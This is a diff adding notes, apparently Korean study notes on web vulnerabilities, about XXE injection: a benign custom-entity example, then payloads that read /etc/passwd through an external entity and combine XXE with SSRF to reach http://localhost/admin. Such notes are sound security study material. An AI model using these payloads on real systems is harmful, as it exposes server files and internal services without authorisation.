@@ -437,3 +437,29 @@ https://expected-host.evil-host
 ### XXE (XML eXternal Entity) Injection
 > XML 파싱 과정에서 발생하는 취약점을 이용하여, 공격하는 기법
 
+- XML custom entity
+  > XML에서 사용자가 정의한 엔티티를 사용하여, 재사용 가능한 문자열을 정의
+
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE message [<!ENTITY greeting "Hello, ">]>
+  <message>
+    <text>&greeting;world!</text>
+  </message>
+  ```
+
+- Access internal file
+  > XML 엔티티를 이용하여, 서버의 파일을 읽어오는 공격
+
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <stockCheck><productId>&xxe;</productId></stockCheck>
+  ```
+
+- With SSRF
+  > SSRF와 결합하여, 외부 서버로 요청을 보내는 공격
+
+  ```xml
+  <!DOCTYPE foo[<!ENTITY xxe SYSTEM "http://localhost/admin">]>
+  ```
